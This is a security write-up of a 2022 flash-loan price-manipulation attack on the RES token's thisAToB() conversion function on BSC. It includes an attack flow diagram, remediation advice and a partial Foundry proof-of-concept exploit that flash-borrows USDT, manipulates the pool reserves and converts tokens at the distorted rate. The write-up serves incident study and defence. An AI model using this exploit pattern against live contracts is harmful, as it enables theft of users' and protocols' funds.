# RES — `thisAToB()`-Based Flash Loan Token Conversion Manipulation Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-10 |
| **Protocol** | RES Token |
| **Chain** | Binance Smart Chain (BSC) |
| **Loss** | 290,671 USDT |
| **RES Token** | [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21](https://bscscan.com/address/0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21) |
| **ALL Token** | [0x04C0f31C0f59496cf195d2d7F1dA908152722DE7](https://bscscan.com/address/0x04C0f31C0f59496cf195d2d7F1dA908152722DE7) |
| **Attack Contract** | [0xFf333DE02129AF88aAe101ab777d3f5D709FeC6f](https://bscscan.com/address/0xFf333DE02129AF88aAe101ab777d3f5D709FeC6f) |
| **Attacker** | [0x986b2e2a1cf303536138d8ac762447500fd781c6](https://bscscan.com/address/0x986b2e2a1cf303536138d8ac762447500fd781c6) |
| **PancakeRouter** | [0x10ED43C718714eb63d5aA57B78B54704E256024E](https://bscscan.com/address/0x10ED43C718714eb63d5aA57B78B54704E256024E) |
| **USDT** | [0x55d398326f99059fF775485246999027B3197955](https://bscscan.com/address/0x55d398326f99059fF775485246999027B3197955) |
| **Root Cause** | `thisAToB()` calculates the RES→ALL conversion rate using the `getReserves()` AMM spot price, allowing arbitrary rate manipulation via reserve manipulation within the same block (no fixed rate or TWAP used) |
| **CWE** | CWE-829: Inclusion of Functionality from Untrusted Control Sphere |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-10/RES_exp.sol) |

---
## 1. Vulnerability Overview

The RES token protocol provided functionality to convert RES into ALL tokens via the `thisAToB()` function. Because the conversion rate depended on the current reserve ratio of the AMM pair, flash loan manipulation of the reserves allowed conversion at a favorable rate. The attacker flash-borrowed 10,014,120 USDT from the USDT-WBNB pair, performed 6 consecutive swaps on the USDT-RES pair to manipulate the RES price, then called `thisAToB()` to convert RES into ALL at an inflated rate, liquidated to USDT, and extracted 290,671 USDT.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable thisAToB() - conversion rate calculated from AMM spot price
contract RESToken {
    IUniPair public resPair; // USDT-RES pair

    function thisAToB(uint256 resAmount) external {
        // ❌ Conversion rate calculated from current pair reserves
        // Reserve manipulation via flash loan can distort the rate
        (uint112 usdtReserve, uint112 resReserve, ) = resPair.getReserves();
        uint256 allAmount = resAmount * uint256(usdtReserve) / uint256(resReserve);

        IERC20(RES).transferFrom(msg.sender, address(this), resAmount);
        // ❌ ALL disbursed at manipulated rate
        IERC20(ALL).transfer(msg.sender, allAmount);
    }
}

// ✅ Correct pattern - use fixed conversion rate or TWAP
contract SafeRESToken {
    uint256 public constant CONVERSION_RATE = 1e18; // Fixed 1:1 rate

    function thisAToB(uint256 resAmount) external {
        IERC20(RES).transferFrom(msg.sender, address(this), resAmount);
        uint256 allAmount = resAmount * CONVERSION_RATE / 1e18;
        IERC20(ALL).transfer(msg.sender, allAmount);
    }
}
```

---
### On-Chain Original Code

Source: Bytecode decompiled


**RES_decompiled.sol** — Entry point:
```solidity
// ❌ Root cause: `thisAToB()` calculates the RES→ALL conversion rate using `getReserves()` AMM spot price, allowing arbitrary rate manipulation via reserve manipulation within the same block (no fixed rate or TWAP used)
    function thisAToB() external {}  // 0x6115880a  // ❌ Vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Flash loan 10,014,120 USDT from USDT-WBNB pair
    │       Enter pancakeCall() callback
    │
    ├─[2] 6 consecutive swaps on USDT-RES pair
    │       Buy RES with increasing USDT on each swap
    │       → RES price (USDT/RES) spikes sharply
    │       → getReserves()-based conversion rate manipulated
    │
    ├─[3] Call thisAToB(resAmount)
    │       ❌ Convert RES → ALL at manipulated reserve ratio
    │           (receive far more ALL than normal)
    │
    ├─[4] Sell ALL → USDT
    │
    ├─[5] Reverse-swap remaining RES → USDT
    │
    ├─[6] Repay flash loan
    │
    └─[7] Net profit: 290,671 USDT
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IRES {
    function thisAToB(uint256 amount) external;
    function approve(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

interface IUniPair {
    function swap(uint256, uint256, address, bytes calldata) external;
    function getReserves() external view returns (uint112, uint112, uint32);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

contract RESExploit is Test {
    IRES res      = IRES(0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21);
    IUniPair flashPair = IUniPair(/* USDT-WBNB */);
    IUniPair resPair   = IUniPair(/* USDT-RES  */);
    IERC20 USDT   = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 ALL    = IERC20(0x04C0f31C0f59496cf195d2d7F1dA908152722DE7);

    function setUp() public {
        vm.createSelectFork("bsc", 21_948_016);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] USDT balance", USDT.balanceOf(address(this)), 18);

        // [Step 1] Flash loan 10M USDT
        flashPair.swap(10_014_120 * 1e18, 0, address(this), abi.encode("exploit"));

        emit log_named_decimal_uint("[End] USDT balance", USDT.balanceOf(address(this)), 18);
    }

    function pancakeCall(address, uint256 amount0, uint256, bytes calldata) external {
        // [Step 2] 6 consecutive swaps on USDT-RES pair (price manipulation)
        for (uint i = 0; i < 6; i++) {
            uint256 portion = amount0 / 10 * (i + 1);
            USDT.transfer(address(resPair), portion);
            (, uint112 r1, ) = resPair.getReserves();
            // USDT → RES swap
            resPair.swap(0, uint256(r1) * portion / (USDT.balanceOf(address(resPair)) - portion), address(this), "");
        }

        // [Step 3] thisAToB() - convert RES → ALL at manipulated rate
        // ⚡ getReserves()-based conversion rate is distorted
        uint256 resBal = IERC20(address(res)).balanceOf(address(this));
        IERC20(address(res)).approve(address(res), resBal);
        res.thisAToB(resBal);

        // [Step 4] Sell ALL + RES → USDT

        // [Step 5] Repay flash loan
        USDT.transfer(address(flashPair), amount0 * 1003 / 1000 + 1);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | AMM spot price-based token conversion rate manipulation |
| **CWE** | CWE-829: Inclusion of Functionality from Untrusted Control Sphere |
| **OWASP DeFi** | Flash loan + oracle manipulation |
| **Attack Vector** | Flash loan → 6-swap price manipulation → `thisAToB()` |
| **Preconditions** | `thisAToB()` conversion rate depends on AMM spot price |
| **Impact** | 290,671 USDT loss |

---
## 6. Remediation Recommendations

1. **Fixed conversion rate**: Pin the token conversion rate to a protocol parameter rather than the AMM spot price.
2. **Use TWAP**: If an AMM price is required, use a time-weighted average price (TWAP).
3. **Per-transaction conversion cap**: Limit the maximum amount that can be converted in a single transaction.

---
## 7. Lessons Learned

- **6-swap sequential manipulation**: Rather than a single large swap, performing multiple swaps with progressively increasing amounts can bypass slippage protection while producing a greater price distortion.
- **Conversion functions like `thisAToB()`**: Any function that dynamically calculates the conversion rate between two tokens using the current market price is inherently vulnerable to flash loan attacks. Conversion rates must be designed with care.